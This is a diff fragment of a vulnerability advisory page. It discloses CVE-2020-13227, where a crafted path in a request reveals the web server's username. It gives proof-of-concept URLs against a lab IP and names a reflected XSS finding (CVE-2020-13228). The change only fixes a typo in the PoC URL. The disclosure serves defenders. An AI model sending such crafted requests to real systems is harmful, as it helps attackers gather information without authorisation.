@@ -4,7 +4,7 @@
 <p>*** Vendor was informed on May 19th, 2020 but I have not received any feedback ***</p>
 <p><strong>1) Insecure Permissions and Information Disclosure via error handling</strong><br />::: CVE-2020-13227 :::</p>
 <p><em>Description</em>:<br />An attacker can determine the username (under which the web server is running) by triggering an invalid path permission error. This bypasses the fakepath protection mechanism.</p>
-<p><em>PoC</em>:<br />http://192.168.88.131/scgi?sid=7d2ec36cd2f0a42929a5672c9cc5f0320a666155&amp;pid=transferpage2_name1_(folder_where_you_don't_have permissions).htm</p>
+<p><em>PoC</em>:<br />http://192.168.88.131/scgi?sid=7d2ec36cd2f0a42929a5672c9cc5f0320a666155&amp;pid=transferpage2_name1_(folder_where_you_don't_have_permissions).htm</p>
 <p><em>E.g</em><br />http://192.168.88.131/scgi?sid=7d2ec36cd2f0a42929a5672c9cc5f0320a666155&amp;pid=transferpage2_name1_johnfolder.htm</p>
 <p><em>PoC screen</em>: https://pasteboard.co/J9eF12G.png</p>
 <p><strong>2) Reflected Cross Site Scripting (XSS)</strong><br />::: CVE-2020-13228 :::</p>
